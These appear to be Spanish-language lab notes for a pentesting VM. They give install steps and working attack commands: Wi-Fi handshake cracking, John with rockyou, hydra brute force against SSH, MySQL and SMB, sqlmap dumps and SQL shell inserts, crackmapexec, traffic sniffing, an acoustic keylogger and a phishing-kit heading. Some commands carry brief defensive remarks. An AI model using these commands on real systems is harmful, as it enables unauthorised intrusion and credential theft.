# üß† vm-pentesting ‚Üí Entorno ofensivo
# üß† John, Nmap, Hydra, Sqlmap, Sherlock, Whatweb, Sublist3r, Tshark 
# üêß Utilizo esta m√°quina como pentesting con varios paquetes de ciberseguridad
# üï∑Ô∏è Esta m√°quina deber√≠a contruirla al final del proyecto pero como en un futuro seguir√© creando m√°quinas, la documento la primera
#=========================================================================================================================
[üï∑Ô∏èWHITE WHALE]::
# Documentaci√≥n Sherlock                    : https://www.kali.org/tools/sherlock/?
# Documentaci√≥n no-oficial ZPHISHER         : https://www.youtube.com/watch?v=IEymiOTavEE
# Documentaci√≥n no-oficial Jonh             : https://www.youtube.com/shorts/9a8LuYSHYe0
# Documentaci√≥n no-oficial aircrack         : https://www.aircrack-ng.org/
# Documentaci√≥n no-oficial nmap             : https://nmap.org/
# Documentaci√≥n no-oficial hydra            : https://github.com/vanhauser-thc/thc-hydra
# Documentaci√≥n no-oficial sqlmap           : https://sqlmap.org/
# Documentaci√≥n no-oficial sherlock         : https://github.com/sherlock-project/sherlock
# Documentaci√≥n no-oficial gobuster         : https://github.com/OJ/gobuster
# Documentaci√≥n no-oficial zphisher         : https://github.com/htr-tech/zphisher
# Documentaci√≥n no-oficial jonh             : https://www.openwall.com/john/
# Documentaci√≥n no-oficial burp             : https://portswigger.net/burp

#=========================================================================================================================
[üï∑Ô∏èINSTALACIONES]::
# instalaciones 
apt update
apt upgrade -y

## ssh
## desde la consola del contenedor a trav√©s de proxmox
# Amplio tiempo de ssh y deshabilitar la suspensi√≥n
systemctl mask sleep.target suspend.target hibernate.target hybrid-sleep.target

# Realizo unos cambios en el archivo de configuraci√≥n
nano /etc/ssh/sshd_config
----------------------------------------------------------------------------
    Port 22
    PasswordAuthentication yes
    PermitRootLogin yes
----------------------------------------------------------------------------

# Inicializo el servicio y lo habilito para inicio de la sesi√≥n
systemctl start sshd
systemctl enable sshd
systemctl status sshd

# reinicio
reboot now

# creo una carpeta en el contenedor e instalo el script
mkdir /ce-500 && cd /ce-500
apt install vim -y
vim script-00.sh
# i - (shift + bot√≥n derecho):
--------------------------------------------------------------------------------------
    # c√≥digo de /SCRIPTS/script-00.sh de este github
--------------------------------------------------------------------------------------

# doy permisos y hago la instalaci√≥n
chmod +x script-00.sh
./script-00.sh
source ~/.bashrc


#=========================================================================================================================
[üï∑Ô∏èPENTESTING]::
# ‚ö†Ô∏è la siguiente documentaci√≥n se a probado en un entorno de laboratorio controlado y no pretendo m√°s que su informaci√≥n sea escolar.
# üë®üëãüéì he realizado una investigaci√≥n del funcionamiento de los promps que he ido utilizando, sobre mi investigaci√≥n de vulnerabilidades y como podri√°n ser los ataques
# üë®üëãüéì estos comandos son los que m√°s interesantes me han parecido



## üï∑Ô∏è lanzo comando para b√∫squeda de vulnerabilidades por ip (instalado en script-00.sh):
scanvuln



# comprobar vulnerabilidad de SSH con terrapin-scanner
## üê¢ instalar terrapin-scanner
# https://terrapin-attack.com/
# https://github.com/RUB-NDS/Terrapin-Scanner
cd /ce-500
wget https://github.com/RUB-NDS/Terrapin-Scanner/archive/refs/heads/main.zip
unzip main.zip
cd Terrapin-Scanner-main
cd /ce-500
apt install golang -y                                                              # instalo GO
go build -o terrapin-scanner main.go                                               # compilo el binario
./terrapin-scanner -help

# ejecuto terrapin en el puerto SSH
cd /ce-500/Terrapin-Scanner-main 
# ./terrapin-scanner -connect <ip_o_host>[:puerto]
./terrapin-scanner -connect 19.101.71.13:22



# lo primero intentar√≠a entrar a trav√©s del wifi si no tengo una interface wifi lo hago con GNS3
# pero como quiero hacer pruebas a nivel interno me salto este paso
# intento entrar al wifi
## üì∂ Wifi
    # instalo aircrack-ng
    sudo apt-get install aircrack-ng -y
    
    # identificar wifi
    iwconfig
    
    # cambio el adaptador a modo monitor 
    sudo airmon-ng start <ADAPTADOR_WIFI>
    
    # escaneo redes (Wi-Fi disponibles, BSSID/MAC, canales...)
    sudo airodump-ng wlan0mon
    
    # capturo el Handshake
    sudo airodump-ng --bssid [BSSID] -c [CANAL] -w captura wlan0mon
    
    # una vez conseguido el archivo de captura, puedo desifrar la contrase√±a
    aircrack-ng -w [ruta/diccionario.txt] -b [BSSID] captura.cap
    2



# una vez consiga un hash, hago fuerza brueta para conseguirlo en texto plano a nivel local
## üé© jonh
# instalo jonh
sudo apt install john -y

# agrego hash que me interesa a un txt
touch /ce-500/hashes.txt
echo -n "password123" | md5sum
# 482c811da5d5b4bc6d497ffa98491e38
echo "482c811da5d5b4bc6d497ffa98491e38" > /ce-500/hash.txt
echo "5f4dcc3b5aa765d61d8327deb882cf99" > /ce-500/hashes.txt

# descargo el dicionario
apt install wget -y
cd /ce-500
wget rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

# suponiendo que tengo un archivo hash.txt que contiene hashes de diferentes tipos
john --wordlist=/ce-500/rockyou.txt /ce-500/hashes.txt
# de esta forma utiliza el diccionario por defecto de john
john /ce-500/hashes.txt                                        

# muestra las contrase√±as que John the Ripper ha descifrado exitosamente
john --show hashes.txt

# credenciales descubiertas
cat ~/.john/john.pot



# escaneo la red por vulnerabilidades, servicios, puertos y dispositivos
## üõú nmap 
# instalo nmap
apt install sudo
apt install nmap

# escaneo de dispositivos
nmap -sP 192.168.1.0/24

# identificaci√≥n de servicios
nmap -sV 192.168.1.1

# detectar dispositivos activos
# üï∑Ô∏è este comando me a servido para conseguir las ip de cada equipo para luego utilizar fuerza bruta
# üî• con un antivirus bueno deber√≠a avisarnos del intento de escaneo del equipo
sudo nmap -sP 192.168.1.0/24

# escanear puertos de una ip
sudo nmap -sS -sV 192.168.1.100

# Escaneo de Vulnerabilidades
sudo nmap --script vuln 192.168.1.100
# üß† Aunque nmap es comunmente utilizado, para un ataque general se utiliza "Masscan", escaneando todo internet, reconociendo puertos abiertos de ips p√∫blicas (ya que es m√°s r√°pido que nmap).



# una vez que conozco las ip, utilizo fuerza bruta para intentar entrar a los servicios
## üêç hydra
apt install hydra
# para ssh
# üï∑Ô∏è con este comando conseguir√° las password del login de ssh
# üî• las medidas son utilizar fail2ban para proteger el login y utilizar contrase√±as robustas
hydra -t 4 -l root -P /ce-500/rockyou.txt ssh://192.168.1.86
hydra -l [usuario] -P [ruta/diccionario.txt] ssh://[IP o dominio]

# para ftp
hydra -l [usuario] -P [ruta/diccionario.txt] ftp://[IP o dominio]

# para http
hydra -l [usuario] -P [ruta/diccionario.txt] [IP o dominio] http-post-form "/ruta/login:username=^USER^&password=^PASS^:Fallo en la autenticaci√≥n"

# para sql
hydra -l root -P [ruta/diccionario.txt] mysql://192.168.1.100

# para telnet 
hydra -l [usuario] -P [ruta/diccionario.txt] telnet://[IP o dominio]

# para rdp
hydra -l [usuario] -P [ruta/diccionario.txt] rdp://[IP o dominio]



# intento conseguir informaci√≥n de la base de datos
## üíâ sqlmap 
# instalo sqlmap
# git clone https://github.com/sqlmapproject/sqlmap.git
# cd sqlmap
apt install sqlmap

# üï∑Ô∏è nunca va encontrar el nombre de la base de datos ya que es una web falsa, pero el honeypot va a registrar cada petici√≥n que haga a la p√°gina
# üî• la soluci√≥n es utilizar las buenas pr√°cticas con (mysql_secure_installation) y monitorizar los registros de intrusi√≥n
# üî• adem√°s, mi script para controlar mi db me env√≠a mensajes al correo por cada petici√≥n y dado que es un servidor web honeypot nadie deber√≠a hacer peticiones...
sqlmap -u "http://192.168.1.86/?id=1" -dbs --level=5 --risk=3

# con la url volnerable (intentar√° enumerar las bases de datos)
python sqlmap.py -u "http://localhost/vulnerable.php?id=1" --dbs

# pruebo a vulnerar con hydra la base de datos : üêç 
hydra -l root -P /ce-500/rockyou.txt mysql://localhost

# si encuentro el nombre de la base de datos puedo enumerar sus tablas
sqlmap -u "http://example.com/vulnerable.php?id=1" -D nombre_base_datos --tables

# obtengo los datos de una tabla especifica de una base de datos
sqlmap -u "http://example.com/vulnerable.php?id=1" -D nombre_base_datos -T nombre_tabla --dump

# si llego hasta aqu√≠ con el paquete de Jonh puedo descifrar luego los hashes de usuarios de la base de datos, puedo entrar al registro web con permisos de administrador
# tambi√©m puedo intentar entrar a la base de datos y crear una nueva tupla
sqlmap -u "http://example.com/vulnerable.php?id=1" --sql-shell

# inserto una tupla acomodandola a esa db
INSERT INTO nombre_tabla (columna1, columna2) VALUES ('valor1', 'valor2');

  # otra forma de hacer lo anterior sin entrar por shell es mandar la consulta directamente
  sqlmap -u "http://example.com/vulnerable.php?id=1" --sql-query "INSERT INTO nombre_tabla (columna1, columna2) VALUES ('valor1', 'valor2');"



# Con los datos conseguidos utilizo sherlock para buscar m√°s informaci√≥n
## üîé Sherlock
# instalaci√≥n
sudo apt install git python3 python3-pip

# repositorio
cd /ce-500
git clone https://github.com/sherlock-project/sherlock.git
cd sherlock

## creo un entorno virtual 
    apt install python3-venv      # instala virtualenv
    python3 -m venv venv          # crea un entorno virtual dentro del directorio donde est√° el proyecto
    source venv/bin/activate      # Activa el entorno virtual    
    pip install -e .              # Esto instalar√≠a las dependencias especificadas en el proyecto si es compatible con pip

# analizo datos de correos de la base de datos
# üï∑Ô∏è con sherlock no solo puedes ver las paginas donde has sido registrado si no si tu correo a sido vulnerado en servicios de recopilaci√≥n
# üî• usar servicios de email temporales para registro de plataformas o accesos exteriores como la que ofrece duckduckgo o protonmail
python3 -m sherlock_project <USUARIO_O_CORREO>

# salgo del entorno virtual 
> deactivate



## üåê whatweb
# para conocer las tecnolog√≠as de una web
apt install whatweb
whatweb http://192.168.1.86/



## ü•∂ sublist3r 
# para automatizar ataques en entornos Windows
# instalaci√≥n
cd /ce-500
git clone https://github.com/Porchetta-Industries/CrackMapExec
cd CrackMapExec

# creo un entorno virtual 
    python3 -m venv venv
    source venv/bin/activate
    python setup.py install
    pip install .
    crackmapexec --help

# ataco por fuerza bruta el protocolo smb
# üêç ataco con fuerza bruta el protocolo smb              : hydra -L /ce-500/usuarios.txt -P /ce-500/rockyou.txt smb://<TARGET_IP>
# üêç                                                      : hydra -l <USER> -P /ce-500/rockyou.txt smb://<TARGET_IP>
# üï∑Ô∏è login exitoso de mi pc personal
# üî• deshabilitar SMBv1 en Windows + detecci√≥n de acceso no autorizado por protocolos con velociraptor
crackmapexec smb <IP_PC_PERSONAL>/24 -u <USER> -p <PASSWORD>    
crackmapexec smb <IP_PC_PERSONAL>/24 -u <USER> -p <PASSWORD> --shares        # para comprobar los shares
smbclient //<IP_PC_PERSONAL>/Users -U <USER>                                 # en caso de poder acceder a /Users puedo entrar hasta la cocina de mi pc personal por smb:\> |

# salgo del entorno virtual 
> deactivate



## ü¶à tshark
# instalaci√≥n
sudo apt install tshark

# para listar las interfaces
tshark -D

# üï∑Ô∏è ataque man-in-the-middle: robo de datos, contrase√±as... 
# üî• arp spoofing detection, cifrar el tr√°fico monitorizando el tr√°fico con zabbix 
# captura paquetes de una red
sudo tshark -i eth0 -V

# filtrar paquetes entre un equipo y el router
sudo tshark -i eth0 -f "host <IP_DESTINO> or host <IP_ROUTER>"

# ejecuto wireshark 
tshark



## ü§ñ gobuster
# para escanear todas las rutas de una web
apt install gobuster
gobuster dir -u http://192.168.1.92:3000 -w /ce-500/rockyou.txt



# Binwalk muestra estructura de un binario, analizandolor con bases de datos similar a magic (como file).
## ü©ª Binwalk
# instalaci√≥n
cd /ce-500
sudo apt install binwalk
binwalk firmware.bin
# YARA se utiliza para identificar y clasificar archivos sospechosos mediante la b√∫squeda de patrones, con la detecci√≥n de malware, exploits y otros archivos.
## ü©ª Yara
sudo apt install yara
yara rules/*.yar <archivo>
# ver reglas
ls rules/
# con una regla en concreto
#yara rules/malware_index.yar /bin/passwd
yara -w rules/malware_index.yar /bin/passwd



# Keylogger por audio 
## ‚å®Ô∏è kbd-audio
# clonar el repositorio
cd /ce-500
git clone https://github.com/ggerganov/kbd-audio
cd kbd-audio/
# inicializar subm√≥dulos
git submodule update --init
# crear directorio de compilaci√≥n
mkdir build
cd build
# instalar dependencias (como root)
apt install cmake libsdl2-dev libfftw3-dev
# configurar y compilar
cmake ..
make -j$(nproc)
# ejecutar grabaci√≥n de teclas por audio
./record ./archivo-registro.kbd
# para detener la grabaci√≥n: 
Ctrl + < 
Ctrl + c
# para ver el audio registrado: (si quiero salir de la misma manera que la anterior)
./play ./salida3.kbd -p1 
# para ver la secuencia con interface
./view-gui ./salida3.kbd -p1
./view-full-gui ./salida3.kbd -p1



# metadatos
## üñºÔ∏è exiftool
# ver metadatos de una im√°gen
apt install exiftool
wget <url>
exiftool <imagen_descargada>



# Con los datos recogidos de usuarios donde obtengo los correos realizo un phising
## üìß Zphiser
# instalaci√≥n
...



